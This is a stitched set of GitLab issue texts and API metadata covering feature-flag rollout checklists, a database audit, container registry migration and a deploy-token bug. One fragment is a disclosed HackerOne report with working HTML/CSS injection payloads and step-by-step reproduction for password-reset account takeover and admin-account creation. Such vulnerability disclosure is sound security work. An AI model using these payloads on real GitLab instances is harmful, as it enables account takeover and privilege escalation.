Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com. \n- [ ] Ensure that any breaking changes have been announced following the [release post process](https://about.gitlab.com/handbook/marketing/blog/release-posts/#deprecations-removals-and-breaking-changes) to ensure GitLab customers are aware.\n- [x] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set ci_fix_rules_if_comparison_with_regexp_variable \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [x] `/chatops run feature set ci_fix_rules_if_comparison_with_regexp_variable \u003crollout-percentage\u003e --random`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set ci_fix_rules_if_comparison_with_regexp_variable true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can [create a separate issue](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `ci_fix_rules_if_comparison_with_regexp_variable`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior.

Look at [the list](https://about.gitlab.com/handbook/product/categories/#categories-a-z) and if there are any other categories it belongs to, add them.\n   - If a table has no category that seems to be a perfect match, assign it to the closest match. Tables _must_ have at least one feature category.\n   - If the table is assigned to a feature category for a different group, open a merge request changing the category and assign it to the EM for the group\n    responsible for that category.\n2. Update the description of the table to give anybody interacting with it context around the purpose and submit a merge request with the\n  information.\n3. Double check the `milestone` and `introduced_by_url` to see if they are accurate\n\n## Tables\n\n- [x] analytics_devops_adoption_segments\n  - [x] devops_reports is the correct feature category or has been updated\n  -

This in turn can delay the time it takes\nto find and fix pressing issues.\n\n## How much time should we expect to spend on this?\n\nDepends, if the team has a lot of tables, it may take a little bit to get all of the information together.\nIf not, this could be _very_ fast. The descriptions are as much or little as the team wants to add. More\ninformation may help folks self service better.\n\n## How urgent is this?\n\nThe urgency is up to the team. If the tables have poor information or are misassigned, that may cause more\nburden on the team when answering questions.","state":"closed","created_at":"2022-04-15T21:17:13.993Z","updated_at":"2022-09-21T12:02:50.863Z","closed_at":"2022-09-02T05:32:43.170Z","closed_by":{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"},"labels":["Category:Database","Database tooling","Deliverable","backend","devops::manage","documentation","group::optimize","priority::3","section::dev","type::maintenance","workflow::production"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"}],"author":{"id":480097,"username":"alexives","name":"Alex Ives","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480097/avatar.png","web_url":"https://gitlab.com/alexives"},"type":"ISSUE","assignee":{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359329","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":72,"completed_count":72},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"72 of 72 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359329","notes":"https://gitlab.com/api/v4/projects/278964/issues/359329/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359329/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359329","relative":"#359329","full":"gitlab-org/gitlab#359329"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7842,"epic":{"id":492559,"iid":7842,"title":"Database Feature Category Audit","url":"/groups/gitlab-org/-/epics/7842","group_id":9970,"human_readable_end_date":"May 31, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106710783,"iid":359322,"project_id":278964,"title":"Design: Introduce incident management workflow to GitLab Slack App","description":"\u003c!-- This issue template can be used as a great starting point for feature requests. The section \"Release notes\" can be used as a summary of the feature and is also required if you want to have your release post blog MR auto generated using the release post item generator:  https://about.gitlab.com/handbook/marketing/blog/release-posts/#release-post-item-generator. The remaining sections are the backbone for every feature in GitLab.\n\nThe goal of this template is brevity for quick/smaller iterations. For a more thorough list of considerations for larger features or feature sets, you can leverage the detailed [feature proposal](https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Feature%20proposal%20-%20detailed.md). --\u003e\n\n### Release notes\n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\n### Background\n\n\u003c!-- What is the user problem you are trying to solve with this issue? --\u003e\n\nIn https://gitlab.com/gitlab-org/gitlab/-/issues/364422+, we investigated some initial ideas for porting over some of the existing Woodhouse Slack app functionality into the newly updated GitLab Slack App. The goal of this would be to enable a more robust Slack-to-GitLab integration for incident responders.\n\nAs part of this work, we plan to introduce the following:\n\n1. A place to define Slack notification settings for incidents\n1. A way to declare an incident from Slack, and include options to \n   * Add relevant information to the incident from Slack at the time of incident creation (following Woodhouse).\n   * Add appropriate additional resources to the incident at the time of incident creation (zoom link, create new Slack channel, again following Woodhouse).\n   * Post a notification of incident creation in the appropriate Slack channel, with links to the relevant resources (following Woodhouse).\n   * Post relevant resources that have been added to the incident issue (following Woodhouse).\n1. A way to keep content synced up between Slack and GitLab\n\nOur goal would be to build on the improved GitLab Slack app the Ecosystem is building. However, if the [notifications haven't yet been ported](https://gitlab.com/gitlab-org/gitlab/-/issues/335673) over to the GitLab Slack app yet, we may need to build on the current GitLab Slack notification integration. More details in [this thread](https://gitlab.com/gitlab-org/gitlab/-/issues/364422#note_1001577223).\n\n### Proposal\n\n\u003c!-- Use this section to explain the feature and how it will work.

After 30 minutes it canceled and skipped as expected. This brought on a few questions:\n\n1. Do we want to skip in this case or retry a few more times?\n2. When we have a canceled migration, how can we tell if rails canceled it or the registry canceled it\n3. We probably don't need to wait 30 minutes.\n4. We should be re-enqueueing after a container repository is skipped to keep the migration running.\n\n## Solution\n\nTo address these questions we will:\n\n1. Re-enqueue after a container repository is skipped.\n2. Add a new skipped state: `migration_canceled_registry`. This will only be used if the cancelation is coming from the registry side\n3.

Create new project\n2. Push more than 100 tags for one image to Container Registry (see script below)\n3.

Once completed, we will be importing the images with more than 100 tags.\n\nCurrently, when an image with more than 100 tags is found, we skip it. So before we are able to import them, we need to reset their state.\n\n## Proposal\n\nCreate two migrations and one code update:\n\n1. Update the Enqueuer so if the `max_tags_count` is 0, we ignore the tag count (return true): https://gitlab.com/gitlab-org/gitlab/-/blob/039e424729bb768eb0964ecaa00a42bb00eae71a/app/workers/container_registry/migration/enqueuer_worker.rb#L68\n1. Create a background migration (possibly a post-deployment migration depending on timing) to update all container repositories with `migration_state: 'skipped', migration_skipped_reason: :too_many_tags` back to `migration_state: 'default'`\n1.

Depending on the payload, this POST request can lead to account takeover(of OAuth/SAML accounts) and also generation of admin accounts giving full access to the whole instance.\n\nFor the H1 triager it is OK to skip to the POC as the description will contain a lot of GitLab specifics.\n\n####  Background  \nThere is a premium feature in GitLab where a user can connect a project with a Jira tracker. See https://docs.gitlab.com/ee/integration/jira/ . When this is set up there will be a path in the project like so: https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues where any tasks created in Jira will be automatically fetched and presented to the members of the project.\n\nGiving a task in Jira a title containing HTML will (if the Jira integration is set up in the project) generate an Jira issue in GitLab with the same title. When viewing the Jira issue details page (https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/ISO-1) this title field will be displayed without proper HTML encoding and thus render the supplied HTML. The caveat here is that this HTML will be sanitized by DOMPurify as it is added through the Vue `v-safe-html` attribute.\n\nBut as I have shown in my previous reports, there exists some JavaScript gadgets that slips through DOMPurify in your current default settings.\n\nIf you reed my other reports you can also see that there exists a gadget leading to full XSS, this do require the injected data to be present in the page on initial load. In this case, the data is fetched in a subsequent request and thus miss the first run through main.js\n\nWhen a detail page for a Jira issue is first visited, the call for the issue data is actually too slow to hit the second tier of JavaScript gadgets (the code inside defered_execution in main.js). But I found a way to bypass this. When a browser leaves a page to visit another page, and then uses History.back (or the back button in the browser) the browser will not generate a complete rerun of the previous requests. It will instead use cached data, even for the data that is not supposed to be cached. So I found out that visiting a infected Jira issue page, browsing away from the page, and then clicking the back button to get to the Jira issue again, will speed up the data call to have it hit by the deferred part of main.js\n\nTo weaponize this, all we need is to first navigate away from the page to a server that just runs `History.back()` to directly redirect the user back to the malicious issue page and the payload will now trigger. All this can be made almost guarantied as the injection also allows for arbitrary CSS to be loaded. This makes it possible to craft a page that have an overlay link that will trigger on clicking anywhere.\n\n####  The payload  \nI will present two payloads that will show the potential damage from this attack.\n\nThere exists a limitation as for the injection, as Jiras tasks have a 255 letter limit. This is not much to work with, but with some trix we can still get both account takeover and admin creation to work inside this payload.\n\nFirst of we have a payload that will be able to perform account takeovers on accounts that do not have a password set. This is all OAuth registered accounts (and as far as I understand also SAML and maybe LDAP accounts). These accounts have an auto generated (strong! As of 14.9.2) password after the user signs up with, for example \"sign in with GitHub\". If the user does not actively go to `/profile/password/edit` and add a new password, the account is vulnerable to this attack. The password update page does not require \"current password\" before an initial password has been set. The payload looks like this  \n```  \n\u003ca href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put\u0026user%5Bnew_password%5D=12345678\u0026user%5Bpassword_confirmation%5D=12345678'\u003e.\u003c/a\u003e\u003cstyle\u003e[@]import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css  \n```  \nIf we pull this apart, we have  \n```  \n\u003ca   \n  href=http:j15.se \u003c--- a site that when visited just throws the user back, saving some chars by omiting slashes  \n  class=js-feature-highlight \u003c--- the classname to be used as a gadget  \n  data-dismiss-endpoint='/-/profile/password?_method=put\u0026user%5Bnew_password%5D=12345678\u0026user%5Bpassword_confirmation%5D=12345678'  \n  ^--- The payload where the POST request will get sent  \n  \u003e  \n.\u003c/a\u003e \u003c--- close the anchor tag  \n\u003cstyle\u003e[@]import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css  \n  ^--- Unlimited styling to make the website a bulletproof click machine :)  \n```  \nThis will generate a link covering the whole screen. When clicked (by clicking anywhere) the browser will go to http://j15.se which is a site that directly throws the user back to where it came from. This time, the browser will fetch the data from its cache and thus make the main.js hit the payload. The user will now have to click the page again to actually send the payload. It is two required clicks, but as we have full CSS control we can make it almost guarantied that a user will try to click somewhere on our page.\n\nWhen the payload have fired, the OAuth user will have a new password. The user will be logged out but nothing else will point to the password having been set. Account takeover complete!\n\n\nThis payload will add a new administrator to the instance if an administrator visits the malicious page  \n```  \n\u003ca href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/api/v4/users?admin=true\u0026email=j@j15.se\u0026name=h\u0026username=hack\u0026password=12345678\u0026skip_confirmation=true'\u003e.\u003c/a\u003e\u003cstyle\u003e[@]import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css  \n```  \nPulled apart  \n```  \n\u003ca href=http:j15.se  \n  class=js-feature-highlight  \n  data-dismiss-endpoint='/api/v4/users?admin=true\u0026email=j@j15.se\u0026name=h\u0026username=hack\u0026password=12345678\u0026skip_confirmation=true'\u003e  \n.\u003c/a\u003e  \n\u003cstyle\u003e[@]import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css  \n```\n\n\n####  Steps to reproduce\n\nThis requires three things:  \n1. access to a premium subscription (no problem on GitLab.com as there are free trials, they work great for the attack)  \n2. a Jira server. I used a cloud Jira instance on atlassian.com  \n3. a third party account that is not registered on GitLab. ex a GitHub user\n\nPOC:  \n1. Create a user `attacker`  \n2. Log in as `attacker` and create a group `attack_group` by visiting https://gitlab.com/groups/new (make sure the group have premium access)  \n3. Create a new project in the group called `attack_proj`  \n4. Go to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/edit  \n5. Follow the guide at https://docs.gitlab.com/ee/integration/jira/issues.html#view-jira-issues to enable viewing Jira issues in the project  \n6. Log in to Jira and create a task on the dashboard and name it `\u003cimg src=#\u003e`  \n7. Go to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues and make sure the task is shown as an issue  \n8. Click the issue to open the Issue details page. The title will render as a broken image. This proves the injection.\n\n![img.jpg](https://h1.sec.gitlab.net/a/715a864c-2251-45fa-ab22-505ee9319798/img.jpg)\n\n9. Now go back to Jira and create a new task and name it  \n```  \n\u003ca href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put\u0026user%5Bnew_password%5D=12345678\u0026user%5Bpassword_confirmation%5D=12345678'\u003e.\u003c/a\u003e\u003cstyle\u003e[@]import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css  \n```  \n10. Go back to the issue list and refresh to make sure it is created  \n11. Now log in to GitLab.com with a third party provider, generating a new account on GitLab.com  \n12. (if the test project is not public invite the new user to the project as a Developer by visiting https://gitlab.com/atack_group/attack_proj/-/project_members)  \n13. Now visit the https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues list with the OAuth user and click the task with the payload  \n14. A page will show up looking empty, click anywhere on the page  \n15. The page will flicker, and now when you hover over the page it will show a big blue button stating \"Got it!\". Click it\n\n![gotit.jpg](https://h1.sec.gitlab.net/a/5946e4a0-f445-430d-880a-3b0296d5033e/gotit.jpg)\n\n16. Refresh the page, you should now be logged out from GitLab.com  \n17. Log in with the OAuth email and the password `12345678`\n\nAccount takeover!\n\nImportant to note here is that the second click on the blue button can be made invisible as the first click. I did not want to spend my whole day in CSS but can get back with it if needed! :)\n\n####  Impact\n\nHTML and CSS injection in Jira issue page can make POST request as victim user. Can lead to account takeover or admin user escalation.\n\n####  What is the current *bug* behavior?\n\nThe name/title field in the Jira issue page is not sanitized\n\n####  What is the expected *correct* behavior?\n\nThe name should be shown sanitized\n\n####  Output of checks\n\nThis bug happens on GitLab.com\n\n####  Impact\n\nAccount takeover and admin user creation through arbitrary POST request in Jira issue\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n*

We think the large number of Mailgun failures (both temporary and permanent) might have quietly induced a large build-up of retries on Mailgun's side. Usually Mailgun will add a permanent suppression to avoid affecting our sending reputation, but in this case we saw large number of temporary failures that should have caused us to stop sending notifications\n\n## Proposal\n\n- Make it possible to handle both Mailgun's temporary and permanent failure hooks.\n- Related code: https://gitlab.com/gitlab-org/gitlab/blob/9c8a128ea056ee9170c7a32ad28a65900ec873aa/app/services/members/mailgun/process_webhook_service.rb\n\n## Engineering breakdown\n\nThings we'll need to do here:\n\n1. Redirect / alias `/-/members/mailgun/permanent_failures` to a more generic `/-/mailgun/permanent_failures`\n1. Add `/-/mailgun/temporary_failures` or we could just make this one endpoint to handle both if payload has data to identify if it's a temporary or permanent failure\n1. For these new endpoints, detect \"invite email\" failures and call `Members::Mailgun::ProcessWebhookService` on those.

Release the change behind a feature flag so we can control exactly when to enable it.\n1. After the feature flag is enabled and before we remove it: set `public_projects_minutes_cost_factor: 0.008` for SaaS-only shared-runners. For this we could get a Gitlab.com admin to change the cost factor for each shared runner from `0` to `0.008`.\n1. Remove feature flag.\n1. Remove the `Project#force_cost_factor?` method.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: ~\"group::pipeline execution\" \n- Most appropriate slack channel to reach out to: `#g_pipeline-execution`\n- Best individual to reach out to: @fabiopitino \n- PM: @jheimbuck_gl \n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\nBefore this FF release:\n- public projects inside namespaces created before July 2021 can use unlimited CI minutes due to a cost factor `0` applied to the duration of jobs executed by shared runners.\n- public projects inside namespaces created **after** July 2021 get a cost factor `0.008` applied which gets the CI minutes be consumed at a slow rate.\n\nAfter this FF release:\n- We apply a CI minutes cost factor `0.008` to all public projects using shared runners, regardless of the date when the namespace of the public project was created.\n\nA cost factor `\u003e 0` such as `0.008` ensures that users don't have anymore unlimited CI minutes while at the same time yield enough shared runners minutes due to the low rate. In the future we will increase this cost factor up to `1.0`.\n\n### When is the feature viable?\n\nWe have sent out notifications to affected users telling them that we enable the feature flag on **June 1st**. We should not enable the feature flag before that date.\n\n### What might happen if this goes wrong?\n\nThe cost factor `0` remains applied to old public projects.\n\n### What can we monitor to detect problems with this?\n\n* Sentry for any unexpected errors\n\n### What can we check for monitoring production after rollouts?\n\n* Count of projects with `ci_project_monthly_usages.amount_used = 0` to stop. For new month we should not expect any entries.\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true --dev`\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n      The best environment to validate the feature in is [staging-canary](https://about.gitlab.com/handbook/engineering/infrastructure/environments/#staging-canary)\n      as this is the first environment deployed to. Note you will need to make sure you are configured to use canary as outlined [here](https://about.gitlab.com/handbook/engineering/infrastructure/environments/canary-stage/)\n      when accessing the staging environment in order to make sure you are testing appropriately.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [x] `/chatops run feature set --project=gitlab-org/gitlab \u003cfeature-flag-name\u003e true`\n    - [x] `/chatops run feature set --project=gitlab-org/gitlab-foss \u003cfeature-flag-name\u003e true`\n    - [x] `/chatops run feature set --project=gitlab-com/www-gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --group=gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e \u003cfeature-flag-name\u003e true`\n- [ ] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [x] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com. \n- [x] Ensure that any breaking changes have been announced following the [release post process](https://about.gitlab.com/handbook/marketing/blog/release-posts/#deprecations-removals-and-breaking-changes) to ensure GitLab customers are aware.\n- [x] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --random`\n  - Enable the feature globally on production environment.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can [create a separate issue](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAs per [https://gitlab.com/gitlab-org/gitlab/-/issues/243722#proposal](release plan) of the feature, as we remove the feature flag we should set `public_projects_minutes_cost_factor: 0.008` for Gitlab.com Shared Runners.\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\nYou can either [create a follow-up issue for Feature Flag Cleanup](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) or use the checklist below in this same issue.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [x] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [x] Remove all references to the feature flag from the codebase.\n    - [x] Remove the YAML definitions for the feature from the repository.\n    - [x] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [x] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [x] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [x] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    -

`audit_event_streaming_git_operations` flag is enabled.\n* This was discovered during the flag rollout: https://gitlab.com/gitlab-org/gitlab/-/issues/357211\n* It also caused a production issue: https://gitlab.com/gitlab-com/gl-infra/production/-/issues/6832\n* The flag was rolled-back until a fix could be put in place.\n\n### Steps to reproduce\n\n* Enable the feature flag `audit_event_streaming_git_operations` on the instance in question.\n* Create a private project on a group with an Ultimate licence.\n* Create a deploy token, with `read_repository`, scope for the project. (Settings -\u003e Repository -\u003e Deploy tokens)\n* Clone the repository using `http` credentials. `git clone https://staging.gitlab.com/compliance-tanuki/test-violations.git`\n* Use the deploy token user/password as the credentials.\n* Expect to see an error like this:\n```\nUsername for 'https://staging.gitlab.com': gitlab+deploy-token-33250\nPassword for 'https://gitlab+deploy-token-33250@staging.gitlab.com':\nerror: RPC failed; HTTP 500 curl 22 The requested URL returned error: 500\nfatal: expected flush after ref listing\n```\n\n### What is the current *bug* behavior?\n\n* 500 error and unable to clone/pull/fetch when the flag is enabled and using a deploy token as a form of authentication.\n\n### What is the expected *correct* behavior?\n\n* No 500 error and the ability to use deploy tokens to `read_repository` using the git CLI.\n\n### Relevant logs and/or screenshots\n\nExample screenshot from a test performed on `staging.gitlab.com`\n\n![Screenshot_2022-04-14_at_10.45.28](/uploads/b2d2f8cfd3929c1d0373594c951a6cd5/Screenshot_2022-04-14_at_10.45.28.png)\n\n### Proposed solution\n\n* Resolve the errors raised in sentry by handling DeployToken as a form of authentication: https://sentry.gitlab.net/gitlab/gitlabcom/issues/3262340/?query=is%3Aunresolved%20deploytoken (Thanks @smcgivern)\n* Attempt feature flag rollout on GitLab.com again.","state":"closed","created_at":"2022-04-14T09:48:27.599Z","updated_at":"2022-05-10T21:44:22.567Z","closed_at":"2022-05-10T21:44:22.544Z","closed_by":{"id":750946,"username":"dennis","name":"Dennis 